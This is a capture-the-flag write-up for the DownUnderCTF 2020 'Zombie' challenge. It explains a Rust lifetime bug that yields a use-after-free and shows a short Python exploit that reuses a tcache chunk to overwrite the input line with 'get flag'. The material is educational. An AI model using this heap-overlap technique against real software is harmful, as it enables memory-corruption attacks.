# DownUnderCTF 2020 - Zombie Writeup
This challenge is about exploiting the Rust bug linked here: https://github.com/rust-lang/rust/issues/25860

Prerequisites: Knowing how the Tcache works.

### The Bug
```Rust
// Issue 25860
fn cell<'a, 'b, T: ?Sized>(_: &'a &'b (), v: &'b mut T) -> &'a mut T { v }

fn virus<'a, T: ?Sized>(input: &'a mut T) -> &'static mut T {
	let f: fn(_, &'a mut T) -> &'static mut T = cell;
	f(&&(), input)
}

fn zombie(size: usize) -> &'static mut [u8] {
	let mut object = vec![b'A'; size];
	let r = virus(object.as_mut());
	r
}
```

I am not experienced with Rust, but I do have experience with C++, which I think has helped me with understanding the issue.
The `virus` function takes a reference to an object and returns a reference to the same object but as if it is static.

So what does this mean? Static objects have unlimited lifetime. The object is not actually static, so when the `zombie` function exits, `object` is destroyed and its memory is freed. But `zombie` returns a reference to it anyway, which may be used by the caller. This is a **Use After Free**, which should not normally happen in Rust outside of unsafe blocks. Here it is allowed because the static fools the compiler into thinking the object is still alive. It's not, it's a zombie.


### The Exploit
Half the job is already done for us by the challenge. Here's the main loop:

```Rust
println!("What will you do?");

let line = lines.next().unwrap().unwrap();

match line.as_str().trim() {
	"get flag" => continue, // if "get flag", skip this cycle
	"infect" => infected = Some(infect(&mut lines)), // calls zombie with user supplied size
	"eat brains" => eat_brains(&mut lines, &mut infected), // modifies the infected array
	"inspect brains" => inspect_brains(&mut lines, &mut infected), // views the `nfected array
	_ => (),
}
		println!("{}", line);

if line.as_str().trim() == "get flag" { // normally this would be impossible to reach!
	let flag = read_to_string("flag.txt").unwrap();
	println!("Here's the flag: {}", &flag);
}
```

Clearly, what the author wants us to do is to exploit the UAF to change the contents of the `line` variable to `"get flag"`. Accomplishing this is easier than it sounds. Rust may not be C but it's still using libc underneath! We can use the heap exploits we already know and "love".


* Use `infect` to allocate an `infected` array of X bytes. This array is then freed to the X size tcache bin and used by our next commands.
* Use `eat brains`, BUT, pad the input with whitespace so that it is X bytes long.
  The string will be allocated using the X size tcache bin, where our array resides! `line` and `infected` now point to the same memory.
* Finish using the `eat brains` command to modify `infected` so that it starts with `get flag  `, spaces included. This modifies `line` as well.

Here's the code to do this. (Full script in exploit.py, in repo)

```Python
infect(0x50)
p.sendline('eat brains'.ljust(0x50))

for i, c in enumerate('get flag  '):
    p.recvuntil('a victim')
    p.sendline(str(i))
    p.recvuntil('ch!')
    p.sendline(str(ord(c)))

p.recvuntil('a victim')
p.sendline('done')
p.interactive()
```

##### Why 2 spaces?
You need to overwrite `eat brains` fully, one space will not suffice. Result would be `get flag s`

##### Why not \x00?
It does not work. I am guessing it's because of Rust's `trim` behavior and its string implementation. See the tests below.

```Rust
fn main() {
    println!("{}", "get flag\x00" == "get flag"); //false
    println!("{}", "get flag ".trim() == "get flag"); //true
    println!("{}", "get flag\x00".trim() == "get flag"); //false
}
```


## The Flag
DUCTF{m3m0ry_s4f3ty_h4ck3d!}

